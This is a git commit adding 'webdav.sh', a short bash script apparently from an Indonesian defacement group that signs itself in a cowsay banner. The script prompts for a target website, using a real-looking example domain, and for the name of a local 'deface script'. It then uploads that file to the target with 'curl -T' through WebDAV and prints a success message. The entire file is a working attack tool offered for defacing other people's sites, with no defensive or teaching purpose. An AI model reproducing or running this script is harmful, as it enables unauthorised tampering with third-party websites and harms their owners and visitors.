dbcf400b04e74c1e2f156529d4f92eba1d5c8a4b
SmileyFace-Ofc <54745233+SmileyFace-Ofc@users.noreply.github.com>
2019-09-04 17:59:51 +0700

    Create webdav.sh

---
+++ webdav.sh
@@ -0,0 +1,17 @@
+clear
+cowsay -f eyes 'WEBDAV SFO
+
+# CREATE  : SMILEY FACE OFFICIAL
+
+# TEAM    : SMILEY FACE
+
+# LEAD     :RAF$
+
+# CONTACT : http.joledeng02@gmail.com
+
+# BLOG     :https://smileyfaceofficial.blogspot.com' | lolcat
+
+read -p " Website Target (http://contsol.co.za)==> " target
+read -p " Nama script Defacenya ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] Selamat : ) anda berhasil"
